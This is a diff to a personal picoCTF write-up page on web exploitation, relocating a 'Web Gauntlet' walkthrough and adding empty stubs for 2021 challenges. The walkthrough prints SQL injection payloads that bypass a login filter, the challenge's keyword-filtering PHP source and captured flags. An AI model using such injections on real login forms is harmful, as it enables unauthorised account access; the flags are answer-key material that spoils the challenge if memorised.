@@ -5,19 +5,35 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 ## Contents
 
 - [Useful References](#useful-references)
-- [Insp3ct0r](#insp3ct0r)
-- [logon](#logon)
-- [where are the robots](#where-are-the-robots)
-- [dont-use-client-side](#dont-use-client-side)
-- [Web Gauntlet](#web-gauntlet)
-- [picobrowser](#picobrowser)
-- [Client-side-again](#client-side-again)
-- [Irish-Name-Repo 1](#irish-name-repo-1)
-- [Irish-Name-Repo 2](#irish-name-repo-2)
-- [Irish-Name-Repo 3](#irish-name-repo-3)
-- [JaWT Scratchpad](#jawt-scratchpad)
-- [Java Script Kiddie](#java-script-kiddie)
-- [Java Script Kiddie 2](#java-script-kiddie-2)
+- [Insp3ct0r (2019)](#insp3ct0r)
+- [logon (2019)](#logon)
+- [where are the robots (2019)](#where-are-the-robots)
+- [dont-use-client-side (2019)](#dont-use-client-side)
+- [picobrowser (2019)](#picobrowser)
+- [Client-side-again (2019)](#client-side-again)
+- [Irish-Name-Repo 1 (2019)](#irish-name-repo-1)
+- [Irish-Name-Repo 2 (2019)](#irish-name-repo-2)
+- [Irish-Name-Repo 3 (2019)](#irish-name-repo-3)
+- [JaWT Scratchpad (2019)](#jawt-scratchpad)
+- [Java Script Kiddie (2019)](#java-script-kiddie)
+- [Java Script Kiddie 2 (2019)](#java-script-kiddie-2)
+- [Web Gauntlet (2020)](#web-gauntlet)
+- [GET aHEAD (2021)](#get-ahead)
+- [Cookies (2021)](#cookies)
+- [Scavenger Hunt (2021)](#scavenger-hunt)
+- [Some Assembly Required 1 (2021)](#some-assembly-required-1)
+- [More Cookies (2021)](#more-cookies)
+- [It is my Birthday (2021)](#it-is-my-birthday)
+- [Who are you? (2021)](#who-are-you)
+- [Some Assembly Required 2 (2021)](#some-assembly-required-2)
+- [Super Serial (2021)](#super-serial)
+- [Most Cookies (2021)](#most-cookies)
+- [Some Assembly Required 3 (2021)](#some-assembly-required-3)
+- [Web Gauntlet 2 (2021)](#web-guantlet-2)
+- [Some Assembly Required 4 (2021)](#some-assembly-required-4)
+- [X marks the spot (2021)](#x-marks-the-spot)
+- [Web Gauntlet 3 (2021)](#web-guantlet-3)
+- [Bithug (2021)](#bithug)
 
 
 ---
@@ -498,192 +514,6 @@ We can see the password is authenticated in an inline javascript in the page.  W
 
 ~~~
 picoCTF{no_clients_plz_b706c5}
-~~~
-
-</details>
-
----
-
-### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
-
----
-
-## Web Gauntlet
-
-- Author: madStacks
-- 200 points
-
-### Description
-
-Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:54319/ http://jupiter.challenges.picoctf.org:54319/filter.php
-
-### Hints
-
-1. You are not allowed to login with valid credentials.
-2. Write down the injections you use in case you lose your progress.
-3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
-4. sqlite.
-5. If your cookie keeps getting reset, try using a private browser window.
-
-### Solutions
-
-<details>
-
-<summary markdown="span">Solution 1</summary>
-
-This challenge is the first [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) challenge in picoCTF picoGym.  As given in the hints, the website uses SQLite. 
-
-We can complete this challenge using only a browser and select inputs to the login form.  A subpage , filter.php, validates and sanitises the POST form input.
-
-The first round, has username and password inputs and the filter.php provides:
-
-~~~php
-Round1: or
-~~~
-
-This shows us that the filter will block and OR statments submitted at index.php.
-
-We can try test POST parameters in the login form with username=test and password=test we get a query string presented on index.php:
-
-~~~sql
-SELECT * FROM users WHERE username='test' AND password='test' 
-~~~
-
-We can use a SQLite cheat sheet at [atta.cked.me](http://atta.cked.me/home/sqlite3injectioncheatsheet).  The comments character is '--'.
-
-Further details at [netsparker.com](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineComments) suggests that the username admin'-- will log us in as admin user by commenting out the password comparator.
-
-We can enter into the form: username=admin'--, password=test.
-
-This provides the query string:
-
-~~~sql
-SELECT * FROM users WHERE username='admin'--' AND password='test' 
-~~~
-
-We are now at round 2, the filter.php now shows:
-
-~~~php
-Round2: or and like = --
-~~~
-
-This filter will remove any "OR", "AND", "LIKE" "=" and "--" strings from our form inputs.  We cannot use the same inputs as before.
-
-We can try using a comment block to break up the -- input, username=admin'-/*comment*/-, password=test however this does not work:
-
-~~~sql
-SELECT * FROM users WHERE username='admin'-/*break*/-' AND password='test' 
-~~~
-
-We get a html response: Invalid username/password.  Alternatively, we can stack the query with the aim of bypassingthe password query with username=admin';, password=test:
-
-We get the following query string:
-
-~~~sql
-SELECT * FROM users WHERE username='admin';' AND password='test' 
-~~~
-
-And we are on to round 3.  The filter.php now shows:
-
-~~~php
-Round3: or and = like > < --
-~~~
-
-This is the same as before, but removes < and >.  We can try the same query as before, username=admin';, password=test:
-
-~~~sql
-SELECT * FROM users WHERE username='admin';' AND password='test' 
-~~~
-
-And we are in to round 4.  The filter now has:
-
-~~~php
-Round4: or and = like > < -- admin
-~~~
-
-This is removing the same as before, but in addition the string "admin".  The injection sheet has a concatenation statement '||' we can use this to split the username and attempt to bypass the filter, username=adm'||'in';, password=test:
-
-~~~sql
-SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
-~~~
-
-We are on to round 5.  php.filter:
-
-~~~php
-Round5: or and = like > < -- union admin
-~~~
-
-We can use the same form inputs as before, username=adm'||'in';, password=test:
-
-~~~sql
-SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
-~~~
-
-We are into round 6 and the filter.php now shows:
-
-~~~php
- <?php
-session_start();
-
-if (!isset($_SESSION["round"])) {
-    $_SESSION["round"] = 1;
-}
-$round = $_SESSION["round"];
-$filter = array("");
-$view = ($_SERVER["PHP_SELF"] == "/filter.php");
-
-if ($round === 1) {
-    $filter = array("or");
-    if ($view) {
-        echo "Round1: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 2) {
-    $filter = array("or", "and", "like", "=", "--");
-    if ($view) {
-        echo "Round2: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 3) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
-    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round3: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 4) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
-    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round4: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 5) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
-    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round5: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round >= 6) {
-    if ($view) {
-        highlight_file("filter.php");
-    }
-} else {
-    $_SESSION["round"] = 1;
-}
-
-// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
-?> 
-~~~
-
-We find the flag picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}.
-
-</details>
-
-### Answer
-
-<details>
-
-<summary markdown="span">Flag</summary>
-
-~~~
-picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
 ~~~
 
 </details>
@@ -2318,6 +2148,825 @@ picoCTF{59d5db659865190a07120652e6c77f84}
 
 ---
 
-Last updated 15 March 2021.
+## Web Gauntlet
+
+- Author: madStacks
+- 200 points
+
+### Description
+
+Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:54319/ http://jupiter.challenges.picoctf.org:54319/filter.php
+
+### Hints
+
+1. You are not allowed to login with valid credentials.
+2. Write down the injections you use in case you lose your progress.
+3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
+4. sqlite.
+5. If your cookie keeps getting reset, try using a private browser window.
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+This challenge is the first [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) challenge in picoCTF picoGym.  As given in the hints, the website uses SQLite. 
+
+We can complete this challenge using only a browser and select inputs to the login form.  A subpage , filter.php, validates and sanitises the POST form input.
+
+The first round, has username and password inputs and the filter.php provides:
+
+~~~php
+Round1: or
+~~~
+
+This shows us that the filter will block and OR statments submitted at index.php.
+
+We can try test POST parameters in the login form with username=test and password=test we get a query string presented on index.php:
+
+~~~sql
+SELECT * FROM users WHERE username='test' AND password='test' 
+~~~
+
+We can use a SQLite cheat sheet at [atta.cked.me](http://atta.cked.me/home/sqlite3injectioncheatsheet).  The comments character is '--'.
+
+Further details at [netsparker.com](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineComments) suggests that the username admin'-- will log us in as admin user by commenting out the password comparator.
+
+We can enter into the form: username=admin'--, password=test.
+
+This provides the query string:
+
+~~~sql
+SELECT * FROM users WHERE username='admin'--' AND password='test' 
+~~~
+
+We are now at round 2, the filter.php now shows:
+
+~~~php
+Round2: or and like = --
+~~~
+
+This filter will remove any "OR", "AND", "LIKE" "=" and "--" strings from our form inputs.  We cannot use the same inputs as before.
+
+We can try using a comment block to break up the -- input, username=admin'-/*comment*/-, password=test however this does not work:
+
+~~~sql
+SELECT * FROM users WHERE username='admin'-/*break*/-' AND password='test' 
+~~~
+
+We get a html response: Invalid username/password.  Alternatively, we can stack the query with the aim of bypassingthe password query with username=admin';, password=test:
+
+We get the following query string:
+
+~~~sql
+SELECT * FROM users WHERE username='admin';' AND password='test' 
+~~~
+
+And we are on to round 3.  The filter.php now shows:
+
+~~~php
+Round3: or and = like > < --
+~~~
+
+This is the same as before, but removes < and >.  We can try the same query as before, username=admin';, password=test:
+
+~~~sql
+SELECT * FROM users WHERE username='admin';' AND password='test' 
+~~~
+
+And we are in to round 4.  The filter now has:
+
+~~~php
+Round4: or and = like > < -- admin
+~~~
+
+This is removing the same as before, but in addition the string "admin".  The injection sheet has a concatenation statement '||' we can use this to split the username and attempt to bypass the filter, username=adm'||'in';, password=test:
+
+~~~sql
+SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
+~~~
+
+We are on to round 5.  php.filter:
+
+~~~php
+Round5: or and = like > < -- union admin
+~~~
+
+We can use the same form inputs as before, username=adm'||'in';, password=test:
+
+~~~sql
+SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
+~~~
+
+We are into round 6 and the filter.php now shows:
+
+~~~php
+ <?php
+session_start();
+
+if (!isset($_SESSION["round"])) {
+    $_SESSION["round"] = 1;
+}
+$round = $_SESSION["round"];
+$filter = array("");
+$view = ($_SERVER["PHP_SELF"] == "/filter.php");
+
+if ($round === 1) {
+    $filter = array("or");
+    if ($view) {
+        echo "Round1: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 2) {
+    $filter = array("or", "and", "like", "=", "--");
+    if ($view) {
+        echo "Round2: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 3) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
+    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round3: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 4) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
+    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round4: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 5) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
+    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round5: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round >= 6) {
+    if ($view) {
+        highlight_file("filter.php");
+    }
+} else {
+    $_SESSION["round"] = 1;
+}
+
+// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
+?> 
+~~~
+
+We find the flag picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## GET aHEAD
+
+- Author: MADSTACKS
+- 20 Points
+
+### Description
+
+Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:15931/
+
+### Hints
+
+1. Maybe you have more than 2 choices
+2. Check out tools like Burpsuite to modify your requests and look at the responses
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Cookies
+
+- Author: MADSTACKS
+- 40 Points
+
+### Description
+
+Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Scavenger Hunt
+
+- Author: MADSTACKS
+- 50 Points
+
+### Description
+
+There is some interesting information hidden around this site http://mercury.picoctf.net:27393/. Can you find it?
+
+### Hints
+
+1. You should have enough hints to find the files, don't run a brute forcer.
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Some Assembly Required 1
+
+- Author: SEARS SCHULZ
+- 70 Points
+
+### Description
+
+http://mercury.picoctf.net:15472/index.html
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## More Cookies
+
+- Author: MADSTACKS
+- 90 Points
+
+### Description
+
+I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:56136/
+
+### Hints
+
+1. https://en.wikipedia.org/wiki/Homomorphic_encryption
+2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## It is my birthday
+
+- Author: MADSTACKS
+- 100 Points
+
+### Description
+
+I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:20277/
+
+### Hints
+
+1. Look at the category of this problem.
+2. How may a PHP site check the rules in the description?
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Who are you
+
+- Author: MADSTACKS
+- 100 Points
+
+### Description
+
+Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/
+
+### Hints
+
+1. It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Some Assembly Required 2
+
+- Author: SEARS SCHULZ
+- 110 Points
+
+### Description
+
+http://mercury.picoctf.net:48841/index.html
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Super Serial
+
+- Author: MADSTACKS
+- 130 Points
+
+### Description
+
+Try to recover the flag stored on this website http://mercury.picoctf.net:14804/
+
+### Hints
+
+1. The flag is at ../flag
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Most Cookies
+
+- Author: MADSTACKS
+- 150 Points
+
+### Description
+
+Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:35697/
+
+### Hints
+
+1. How secure is a flask cookie?
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Some Assembly Required 3
+
+- Author: SEARS SCHULZ
+- 160 Points
+
+### Description
+
+http://mercury.picoctf.net:60022/index.html
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Web Gauntlet 2
+
+- Author: MADSTACKS
+- 170 Points
+
+### Description
+
+This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:21336/ Filter: http://mercury.picoctf.net:21336/filter.php
+
+### Hints
+
+1. I tried to make it a little bit less contrived since the mini competition.
+2. Each filter is separated by a space. Spaces are not filtered.
+3. There is only 1 round this time, when you beat it the flag will be in filter.php.
+4. There is a length component now.
+5. sqlite
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Some Assembly Required 4
+
+- Author: SEARS SCHULZ
+- 200 Points
+
+### Description
+
+http://mercury.picoctf.net:54609/index.html
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## X marks the spot
+
+- Author: MADSTACKS
+- 250 Points
+
+### Description
+
+Another login you have to bypass. Maybe you can find an injection that works? http://mercury.picoctf.net:33594/
+
+### Hints
+
+1. XPATH
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Web Gauntlet 3
+
+- Author: MADSTACKS
+- 300 Points
+
+### Description
+
+Last time, I promise! Only 25 characters this time. Log in as admin Site: http://mercury.picoctf.net:28715/ Filter: http://mercury.picoctf.net:28715/filter.php
+
+### Hints
+
+1. Each filter is separated by a space. Spaces are not filtered.
+2. There is only 1 round this time, when you beat it the flag will be in filter.php.
+3. sqlite
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## Bithug
+
+- Author: ZWAD3
+- 500 Points
+
+### Description
+
+Code management software is way too bloated. Try our new lightweight solution, BitHug.
+Source: distribution.tgz
+
+### Hints
+
+1. Every user gets their own target repository to attack called _/.git, but no permission to read it
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+Last updated 09 May 2021.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
